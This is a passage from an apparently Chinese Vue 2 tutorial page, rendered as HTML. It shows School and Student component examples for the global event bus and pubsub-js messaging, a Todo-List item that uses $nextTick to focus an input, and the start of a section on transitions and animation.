class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;School&quot;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;尚硅谷&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">address</span>: <span class="hljs-string">&quot;北京&quot;</span>,</span><br><span class="language-javascript">      &#125;;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-comment">//🔴</span></span><br><span class="language-javascript">      <span class="hljs-comment">// console.log(&#x27;School&#x27;,this)</span></span><br><span class="language-javascript">      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$on(<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;我是School组件，收到了数据&quot;</span>, data);</span><br><span class="language-javascript">      &#125;);</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-comment">//🔴</span></span><br><span class="language-javascript">      <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$off(<span class="hljs-string">&quot;hello&quot;</span>);</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.school</span> &#123;<span class="hljs-attribute">background-color</span>: skyblue;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Student.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;student&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生性别：&#123;&#123; sex &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sendStudentName&quot;</span>&gt;</span>把学生名给School组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> //🔴<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Student&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;张三&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;  <span class="hljs-comment">//🔴</span></span><br><span class="language-javascript">      <span class="hljs-title function_">sendStudentName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$emit(<span class="hljs-string">&#x27;demo&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.student</span>&#123;<span class="hljs-attribute">background-color</span>: pink;<span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    </p><p>![在这里插入图片描述](<a href="https://img-blog.csdnimg.cn/86238df578224c798ab772db2798b85c.png?x-oss-">https://img-blog.csdnimg.cn/86238df578224c798ab772db2798b85c.png?x-oss-</a><br>process&#x3D;image&#x2F;watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)</p><p>![在这里插入图片描述](<a href="https://img-blog.csdnimg.cn/5aeffb62c4f3462ea9b5fb7b98a1b0da.png?x-oss-">https://img-blog.csdnimg.cn/5aeffb62c4f3462ea9b5fb7b98a1b0da.png?x-oss-</a><br>process&#x3D;image&#x2F;watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qC86Zu354uQ5oCd,size_20,color_FFFFFF,t_70,g_se,x_16)</p><h2 id="2-6-消息订阅与发布-基本不用"><a href="#2-6-消息订阅与发布-基本不用" class="headerlink" title="2.6 消息订阅与发布(基本不用)"></a>2.6 消息订阅与发布(基本不用)</h2><ol><li><p>一种组件间通信的方式，适用于任意组件间通信。</p></li><li><p>使用步骤：</p><ol><li><p>安装pubsub：<code>npm i pubsub-js</code></p></li><li><p>引入: <code>import pubsub from &#39;pubsub-js&#39;</code></p></li><li><p>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">methods</span>: &#123;<br>        <span class="hljs-title function_">demo</span>(<span class="hljs-params">msgName, data</span>) &#123;...&#125;<br>    &#125;<br>    ...<br>    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">pid</span> = pubsub.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">demo</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>提供数据：pubsub.publish(‘xxx’,data) </p></li><li><p>最好在beforeDestroy钩子中，使用pubsub.unsubscribe(pid)取消订阅</p></li></ol></li></ol><blockquote><p>示例代码</p></blockquote><p>订阅消息</p><p><strong>School.vue</strong></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;school&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> pubsub <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pubsub-js&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;School&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;尚硅谷&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;北京&#x27;</span>,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">demo</span>(<span class="hljs-params">msgName, data</span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;我是School组件，收到了数据：&#x27;</span>,msgName, data)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">pubId</span> = pubsub.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">&#x27;demo&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">demo</span>) <span class="hljs-comment">// 订阅消息</span></span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">pubsub.<span class="hljs-title function_">unsubscribe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">pubId</span>) <span class="hljs-comment">// 取消订阅</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.school</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: skyblue;</span><br><span class="language-css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Student.vue</strong></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;student&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生姓名：&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学生性别：&#123;&#123;sex&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sendStudentName&quot;</span>&gt;</span>把学生名给School组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> pubsub <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pubsub-js&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Student&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;JOJO&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>,</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-title function_">sendStudentName</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        pubsub.<span class="hljs-title function_">publish</span>(<span class="hljs-string">&#x27;demo&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>) <span class="hljs-comment">// 发布消息</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.student</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">30px</span>;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    </p><h2 id="2-7-nextTick"><a href="#2-7-nextTick" class="headerlink" title="2.7 nextTick"></a>2.7 nextTick</h2><pre><code class="hljs">1. 语法：`this.$nextTick(回调函数)`2. 作用：在下一次 DOM 更新结束后执行其指定的回调。3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</code></pre><p>使用 $nextTick 优化 Todo-List<br>src&#x2F;components&#x2F;MyItem.vue</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">:checked</span>=<span class="hljs-string">&quot;todo.done&quot;</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">&quot;changeObjDone&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!todo.isEdit&quot;</span>&gt;</span>&#123;&#123; todo.title &#125;&#125; <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;todo.isEdit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;todo.title&quot;</span> @<span class="hljs-attr">blur</span>=<span class="hljs-string">&quot;handleBlur&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;inputTitle&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;deleteTodoObj&quot;</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-edit&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;editTodoObj&quot;</span>&gt;</span>编辑<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;MyItem&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">todo</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">p_todo</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">props</span>: [<span class="hljs-string">&quot;p_todo&quot;</span>],</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">changeObjDone</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">id</span>)</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$emit(<span class="hljs-string">&#x27;changeObjDone&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">id</span>)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">deleteTodoObj</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (<span class="hljs-title function_">confirm</span>(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>)) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$emit(<span class="hljs-string">&#x27;deleteTodoObj&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">id</span>)</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-comment">//开始编辑</span></span><br><span class="language-javascript">            <span class="hljs-title function_">editTodoObj</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">isEdit</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">isEdit</span></span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.$nextTick(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">inputTitle</span>.<span class="hljs-title function_">focus</span>()</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-comment">// 失去焦点</span></span><br><span class="language-javascript">            <span class="hljs-title function_">handleBlur</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">isEdit</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">todo</span>.<span class="hljs-property">isEdit</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-comment">/*item*/</span></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">list-style</span>: none;</span><br><span class="language-css">        <span class="hljs-attribute">height</span>: <span class="hljs-number">36px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">line-height</span>: <span class="hljs-number">36px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">5px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">float</span>: left;</span><br><span class="language-css">        <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">input</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">vertical-align</span>: middle;</span><br><span class="language-css">        <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">6px</span>;</span><br><span class="language-css">        <span class="hljs-attribute">position</span>: relative;</span><br><span class="language-css">        <span class="hljs-attribute">top</span>: -<span class="hljs-number">1px</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">button</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">float</span>: right;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: none;</span><br><span class="language-css">        <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">3px</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">content</span>: initial;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">border-bottom</span>: none;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:hover</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">button</span> &#123;</span><br><span class="language-css">        <span class="hljs-attribute">display</span>: block;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="2-8-Vue封装的过度与动画"><a href="#2-8-Vue封装的过度与动画" class="headerlink" title="2.8 Vue封装的过度与动画"></a>2.8 Vue封装的过度与动画</h2><pre><code class="hljs">1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。2. 图示： </code></pre><p>  <img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124154948347.png" alt="image-20221124154948347"></p><ol 